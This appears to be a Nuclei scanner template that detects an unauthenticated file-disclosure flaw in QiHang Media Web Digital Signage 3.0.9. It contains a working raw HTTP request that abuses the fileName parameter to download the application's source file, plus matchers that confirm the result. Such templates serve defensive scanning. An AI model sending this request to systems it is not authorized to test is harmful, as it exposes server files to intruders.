id: qihang-media-web-lfi

info:
  name: QiHang Media Web (QH.aspx) Digital Signage 3.0.9 Arbitrary File Disclosure Vulnerability
  author: gy741
  severity: high
  description: The application suffers from an unauthenticated file disclosure vulnerability when input passed thru the filename parameter when using the download action or thru path parameter when using the getAll action is not properly verified before being used. This can be exploited to disclose contents of files and directories from local resources.
  reference: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2020-5581.php
  tags: qihang,lfi

requests:
  - raw:
      - |
        GET /QH.aspx?responderId=ResourceNewResponder&action=download&fileName=.%2fQH.aspx HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
        Accept-Encoding: gzip, deflate
        Accept-Language: en-US,en;q=0.9
        Connection: close

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "attachment"
          - "application/zip"
        part: header
        condition: and

      - type: word
        regex:
          - "QH.aspx.cs"
          - "QiHang.Media.Web.QH"
        condition: and

      - type: status
        status:
          - 200
